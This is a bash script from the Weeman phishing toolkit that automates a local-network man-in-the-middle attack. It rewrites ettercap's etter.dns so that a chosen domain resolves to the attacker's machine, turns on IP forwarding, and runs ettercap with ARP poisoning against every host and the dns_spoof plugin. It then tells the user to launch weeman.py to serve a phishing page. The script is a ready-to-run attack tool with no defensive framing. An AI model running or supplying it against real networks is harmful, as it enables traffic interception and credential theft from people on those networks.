#!/usr/bin/env bash
#
# Weeman ettercap script
#
# Version 0.1
#
# This file is part of Weeman/tools
#
# See 'LICENSE' for copying
#

ETER_CONFIG_PATH="/etc/ettercap"

# Check if ettercap installed
if [ ! -x /bin/ettercap ];then
	echo -e "\033[01;31m>>> Error: Please install ettercap.\033[00m"
	exit 1
fi

# Check if is root
if [ $UID -ne 0 ];then
	echo -e "\033[01;31m>>> Error: Please run as root.\033[00m"
	exit 1
fi

# Wireless interface
iface=$(awk -F ':' 'NR==3{print $1}' /proc/net/wireless)

# Local IP
lip=$(ifconfig $iface | grep "inet" | awk 'NR==1{print $2}')

# All good 
function start() {
  echo -e "\033[01;32m>>> echo 1 > /proc/sys/net/ipv4/ip_forward .\033[00m"
  echo 1 > /proc/sys/net/ipv4/ip_forward
  echo -e "\033[01;37m>>> Starting ettercap with dns_spoof plugin ...\033[00m"
  echo -e "\033[01;37m>>> Using $iface ...\033[00m"
  echo -e "\033[01;31m[!] Now it's time to open new terminal with weeman.py ...\033[00m"
  echo -e "\033[01;37m"
  ettercap -T -q -i "$iface"  -M arp -P dns_spoof // //
  echo -e "\033[00m"
  echo -e "\033[01;34m>>> g0t r00t? <<<\033[00m"
  echo -e "\033[01;32m>>> echo 0 > /proc/sys/net/ipv4/ip_forward .\033[00m"
  echo 0 > /proc/sys/net/ipv4/ip_forward
  echo -e "\033[01;32m>>> Recovering etter.dns .\033[00m"
  mv "${ETER_CONFIG_PATH}/etter.dns.bak" "${ETER_CONFIG_PATH}/etter.dns"
  echo -e "\033[01;37m>>> Script done, visit https://github.com/Hypsurus/weeman for updates  ...\033[00m"
}

# Create etter.dns 
function create_etter() {
  echo -e "\033[01;37m>>> Creating etter.dns file ...\033[00m"
  if [ ! -f "${ETER_CONFIG_PATH}/etter.dns" ];then
	echo -e "\033[01;31m>>> Error: file: ${ETER_CONFIG_PATH}/eter.dns not found.\033[00m"
	exit 1
  fi
  cp "${ETER_CONFIG_PATH}/etter.dns" "${ETER_CONFIG_PATH}/etter.dns.bak"
  echo -e "\033[01;37m>>> Backup file ${ETER_CONFIG_PATH}/etter.dns.bak saved ...\033[00m"
  echo -e "\033[01;34m[!] host name without www. or http just the domain! the script will add www.\033[00m"
  read -p ">>> Host to spoof (localhost): " hspoof
  echo -e "# Created by Weeman/tools.\n" > "${ETER_CONFIG_PATH}/etter.dns"
  echo "${hspoof}          A   ${lip}" >> "${ETER_CONFIG_PATH}/etter.dns"
  echo "*.${hspoof}        A   ${lip}" >> "${ETER_CONFIG_PATH}/etter.dns"
  echo "www.${hspoof}      PTR ${lip}" >> "${ETER_CONFIG_PATH}/etter.dns"
  echo -e "\033[01;37m>>> etter.dns created.\033[00m"
}	

function main() {
  echo -e "\033[01;33m::::::::::::::::::::::::::::::::::\033[00m"
  echo -e "\033[01;33m::: ettercap script for weeman :::\033[00m"
  echo -e "\033[01;33m:::      by Hypsurus           :::\033[00m"
  echo -e "\033[01;33m::::::::::::::::::::::::::::::::::\033[00m\n"
  create_etter
  start
}

main
